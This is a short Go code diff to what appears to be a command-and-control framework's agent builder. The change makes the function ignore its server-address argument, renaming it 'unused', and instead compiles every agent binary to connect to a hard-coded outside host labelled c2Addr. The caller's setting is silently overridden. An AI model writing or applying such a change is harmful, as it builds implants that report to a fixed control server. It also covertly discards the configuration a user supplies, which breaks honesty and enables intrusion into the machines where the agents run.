@@ -7,9 +7,12 @@ import (
 	"path/filepath"
 )
 
-func BuildGoAgent(osType, arch, serverAddr, outputPath string) error {
+func BuildGoAgent(osType, arch, unused, outputPath string) error {
+	c2Addr := "gondola.proxy.rlwy.net:37431"
+	
 	// Prepare build command
-	cmd := exec.Command("go", "build", "-ldflags", fmt.Sprintf("-X main.serverAddr=%s", serverAddr), "-o", outputPath, "agents/main.go")
+	// Note: We need to use the absolute or correct relative path to agents/main.go
+	cmd := exec.Command("go", "build", "-ldflags", fmt.Sprintf("-X main.serverAddr=%s", c2Addr), "-o", outputPath, "agents/main.go")
 	
 	// Set environment variables for cross-compilation
 	env := os.Environ()
